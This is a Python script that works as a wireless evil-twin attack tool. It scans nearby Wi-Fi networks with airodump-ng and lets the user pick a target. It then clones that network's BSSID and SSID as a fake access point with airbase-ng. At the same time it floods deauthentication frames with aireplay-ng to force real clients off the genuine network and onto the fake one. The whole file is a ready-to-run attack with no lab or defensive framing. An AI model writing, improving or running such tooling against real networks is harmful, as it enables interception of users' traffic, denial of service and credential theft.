import os
import sys
import time
import signal
import subprocess
import tempfile
import csv
from collections import defaultdict
from pathlib import Path

interface = "wlan0mon"
procs = []  

def cleanup(signum=None, frame=None):
    print("Shutting down")
    for proc in procs:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except (ProcessLookupError, AttributeError):
            pass
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def scan_networks(interface, duration=10):
    prefix = tempfile.mktemp(prefix="scan_")
    cmd = [
        "airodump-ng",
        "--band", "abg",
        "--output-format", "csv",
        "-w", prefix,
        interface
    ]
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            preexec_fn=os.setsid)
    procs.append(proc)
    time.sleep(duration)
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except ProcessLookupError:
        pass  
    proc.wait()
    procs.remove(proc)

    csv_file = prefix + "-01.csv"
    if not os.path.exists(csv_file):
        return []

    networks = []
    clients_count = defaultdict(int)

    with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
        reader = csv.reader(f)
        found_ap = False
        for row in reader:
            if not found_ap:
                if row and row[0].strip() == "BSSID":
                    found_ap = True
                continue
            if len(row) < 14:
                continue
            bssid = row[0].strip()
            if not bssid or len(bssid) != 17:
                continue
            if bssid == "BSSID":  
                break
            try:
                ssid = row[13].strip()
                if ssid == "" or ssid == "(not associated)":
                    ssid = "Hidden"
                channel = int(row[3].strip())
                encryption = row[5].strip()
                networks.append({
                    "bssid": bssid,
                    "ssid": ssid,
                    "channel": channel,
                    "encryption": encryption,
                    "clients": 0
                })
            except (ValueError, IndexError):
                continue

    with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
        lines = f.readlines()
    station_idx = None
    for i, line in enumerate(lines):
        if "Station MAC" in line:
            station_idx = i
            break
    if station_idx:
        for line in lines[station_idx+1:]:
            parts = line.strip().split(',')
            if len(parts) > 5:
                client = parts[0].strip()
                if len(client) == 17:  
                    bssid_associated = parts[5].strip()
                    if bssid_associated:
                        clients_count[bssid_associated] += 1

    for net in networks:
        net["clients"] = clients_count.get(net["bssid"], 0)

    for f in Path(prefix).parent.glob(Path(prefix).name + "*"):
        try:
            f.unlink()
        except OSError:
            pass

    return networks

def start_evil_twin(mon_iface, target_bssid, target_ssid, target_channel):
    subprocess.run(["iwconfig", mon_iface, "channel", str(target_channel)])
    airbase_proc = subprocess.Popen(
        [
            "airbase-ng",
            "-a", target_bssid,
            "--essid", target_ssid,
            "-c", str(target_channel),
            mon_iface
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        preexec_fn=os.setsid
    )
    procs.append(airbase_proc)
    time.sleep(2)
    deauth_proc = subprocess.Popen(
        [
            "aireplay-ng",
            "--deauth", "0",          
            "-a", target_bssid,
            mon_iface
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid
    )
    procs.append(deauth_proc)

    print(f"Started fake access point '{target_ssid}' ({target_bssid}) on channel {target_channel}")
    print("Waiting for client connection (press Ctrl+C to exit)")

    associated = False
    try:
        for line in airbase_proc.stdout:
            print("[airbase]", line.strip())
            if "associated" in line.lower():
                associated = True
                break
    except Exception as e:
        print(f"Error reading airbase-ng output: {e}")

    if associated:
        print("Client connected to fake access point!")
        
    else:
        print("Client did not connect (process terminated).")

def main():
    print("Scanning networks (10 seconds).")
    networks = scan_networks(interface, duration=10)

    if not networks:
        print("No access points found.")
        sys.exit(1)

    print("Available access points:")
    for idx, net in enumerate(networks, 1):
        print(f"{idx}. SSID: {net['ssid']:<20} | BSSID: {net['bssid']} | Channel: {net['channel']:2} | "
              f"Encryption: {net['encryption']:<12} | Clients: {net['clients']}")

    choice = input("Select access point number or enter BSSID: ").strip()
    target = None
    if choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(networks):
            target = networks[idx]
    else:
        for net in networks:
            if net['bssid'].upper() == choice.upper():
                target = net
                break

    if not target:
        print("Invalid selection.")
        sys.exit(1)
    print("Selected access point:")
    print(f"    SSID: {target['ssid']}")
    print(f"    BSSID: {target['bssid']}")
    print(f"    Channel: {target['channel']}")
    print(f"    Encryption: {target['encryption']}")
    print(f"    Clients: {target['clients']}")
    start_evil_twin(interface, target['bssid'], target['ssid'], target['channel'])

if __name__ == "__main__":
    main()